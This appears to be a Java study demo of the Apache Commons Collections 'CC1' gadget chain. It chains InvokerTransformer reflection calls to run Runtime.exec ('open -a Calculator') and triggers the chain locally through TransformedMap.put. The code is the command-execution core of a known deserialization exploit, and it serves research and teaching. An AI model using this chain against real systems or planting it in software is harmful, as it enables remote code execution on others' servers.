package com.sweet.commonscollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

/**
 * @author sweet
 * @description
 * @date 2021/2/23 18:34
 */
public class CC1Demo2 {
    public static void main(String[] args) {
        // null 可以用new Class[0] 或者 new Object() 代替
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
//        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{new Object(), new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"open -a Calculator"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap<>(16);

        Map outMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outMap.put("test", "xxx");
    }
}
